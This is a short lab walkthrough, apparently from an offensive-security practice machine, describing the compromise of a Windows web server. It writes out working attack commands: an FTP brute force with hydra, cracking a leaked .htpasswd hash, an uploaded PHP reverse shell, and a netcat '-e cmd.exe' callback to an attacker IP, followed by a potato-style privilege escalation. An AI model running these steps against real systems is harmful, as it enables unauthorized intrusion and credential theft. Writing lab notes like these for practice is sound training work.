## Takeaway
## Metadata
- Port `21` is running `FTP Server` that allows anonymous login. After running `wget -m ftp://anonymous:@192.168.222.46`, one can not download all the files because of the lack of read privilege.
	- However, one can indeed find couple accounts (`Offsec`, `admin`) on the `FTP Server` under `accounts` directory.![[Pasted image 20240322123109.png]]
- Brute force password for user `Offsec` and `admin` with `hydra -L ftp_user.txt -P /usr/share/wordlists/seclists/Passwords/twitter-banned.txt  -e nsr 192.168.222.46 ftp`. One can identify valid credential pair as `admin:admin`![[Pasted image 20240322123410.png]]
- Using `wget -m ftp://admin:admin@192.168.222.46`, one can retrieve `index.php`, `.htpasswd`, `.htaccess` which potentially contains passwords to access port `242`.
	- One can locate a pair of credential in `.htpasswd` as `offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0` where `hashid` identifies as `Apache MD5`.![[Pasted image 20240322123922.png]]![[Pasted image 20240322123943.png]]
	- Run `hashcat -m 1600 offsec.hash /usr/share/wordlists/rockyou.txt --force --username` to crack the credential pair as `offsec:elite`.![[Pasted image 20240322124316.png]]
	- According to `.htaccess`, the FTP Server is serving user `admin` from `c:\\wamp\www\`![[Pasted image 20240322124533.png]]
# Exploitation
## Shell as apache
- Generate payload with `Reverse Shell Generator` and upload using FTP Server.
- Navigate to `http://192.168.222.46:242/rev.php` to trigger the reverse shell call back to get an ugly shell.
- Upload `nc.exe` and run `.\nc.exe 192.168.45.189 443 -e cmd.exe` to get an interactive session.
# PrivEsc
- Kernel Exploit since fresh install of `Windows 2008R2 Server`.
- Abuse `SeImpersonatePrivilege` with `EfsPotato`
	- Compile yourself
	- Meterpreter